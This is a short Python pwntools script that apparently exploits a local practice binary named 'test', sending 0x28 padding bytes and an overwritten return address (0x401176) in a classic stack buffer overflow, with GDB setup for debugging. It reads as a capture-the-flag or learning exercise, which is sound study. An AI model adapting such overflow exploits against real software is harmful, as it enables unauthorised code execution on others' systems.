import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'test'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

payload = (b'!' * 0x28) + p64(0x401176)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
context.log_level = 'debug'

io = start(exe=str(exe), gdb_script=gdb_script)

warning('THIS SCRIPT MUST BE RUN WITHOUT BUFFERING! (stdbuf -i0 -o0 -e0 [cmd])')

io.recvuntil(b'Enter payload here: ')
info(f'Sending Payload: {payload}')
io.sendline(payload)

success(io.recv())
